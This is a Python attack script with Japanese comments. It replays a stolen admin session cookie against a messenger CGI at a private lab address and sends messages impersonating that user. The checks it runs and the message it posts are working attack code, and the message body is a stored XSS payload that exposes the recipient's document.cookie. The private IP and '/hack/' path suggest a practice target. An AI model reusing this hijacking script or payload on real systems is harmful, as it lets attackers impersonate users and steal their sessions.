#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import urllib.parse

# セッションハイジャック用のスクリプト
# 盗んだセッションIDを使用して他人としてメッセージを送信

def send_message_with_hijacked_session(session_id, recipient, message_content, target_url):
    """
    セッションハイジャックを使用してメッセージを送信
    
    Args:
        session_id: 盗んだセッションID
        recipient: 送信先のユーザー名
        message_content: メッセージ内容
        target_url: ターゲットURL
    """
    
    # POSTデータの準備
    post_data = {
        'action': 'transmit',
        'recipient': recipient,
        'message_content': message_content
    }
    
    # Cookieヘッダーの設定（セッションIDを含む）
    # 実際のリクエストに合わせてuser_idとsession_idの両方を設定
    user_id, session_token = session_id.split(',', 1)
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'ja,en-US;q=0.9,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': f'user_id={user_id}; session_id={session_token}',
        'Host': '192.168.49.128',
        'Origin': 'http://192.168.49.128',
        'Referer': 'http://192.168.49.128/hack/public/messenger.cgi',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
    }
    
    try:
        # HTTPリクエストを送信
        response = requests.post(
            target_url,
            data=post_data,
            headers=headers,
            timeout=10
        )
        
        print(f"[*] Status Code: {response.status_code}")
        print(f"[*] Response Headers: {dict(response.headers)}")
        print(f"[*] Response Content (first 1000 chars):")
        print(response.text[:1000])
        print(f"[*] " + "="*50)
        
        # 成功/失敗の判定
        if response.status_code == 200:
            if "Error:" in response.text:
                print(f"[!] Error detected in response")
                return False
            elif "Terminal X - Login" in response.text:
                print(f"[!] Session expired or invalid - redirected to login")
                return False
            elif "SECURE_MESSENGER" in response.text:
                print(f"[+] Successfully accessed messenger page!")
                return True
            else:
                print(f"[+] Message sent successfully!")
                return True
        else:
            print(f"[!] HTTP Error: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return False

def main():
    # 盗んだセッション情報
    hijacked_session_id = "admin,c1d0f140842f7b8c1a766c86528124b3"
    
    # ターゲット情報
    target_url = "http://192.168.49.128/hack/public/messenger.cgi"
    recipient = "user1"
    message_content = "<script>alert('XSS Attack! Session ID: ' + document.cookie);</script>"
    
    print(f"[*] Session Hijacking Attack")
    print(f"[*] Target URL: {target_url}")
    print(f"[*] Hijacked Session ID: {hijacked_session_id}")
    print(f"[*] Recipient: {recipient}")
    print(f"[*] Message: {message_content}")
    print(f"[*] " + "="*50)
    
    # 最初にGETリクエストでセッションが有効かチェック
    print(f"[*] Checking session validity...")
    user_id, session_token = hijacked_session_id.split(',', 1)
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'ja,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Cookie': f'user_id={user_id}; session_id={session_token}',
        'Host': '192.168.49.128',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
    }
    
    try:
        # GETリクエストでセッションチェック
        response = requests.get(target_url, headers=headers, timeout=10)
        
        if "Terminal X - Login" in response.text:
            print(f"[!] Session is invalid or expired")
            return
        elif "SECURE_MESSENGER" in response.text:
            print(f"[+] Session is valid! Proceeding with message sending...")
        else:
            print(f"[?] Unexpected response, but continuing...")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Session check failed: {e}")
        return
    
    # メッセージ送信を実行
    success = send_message_with_hijacked_session(
        hijacked_session_id,
        recipient,
        message_content,
        target_url
    )
    
    if success:
        print(f"[+] Attack completed successfully!")
    else:
        print(f"[!] Attack failed!")

if __name__ == "__main__":
    # まず通常の攻撃を試行
    main()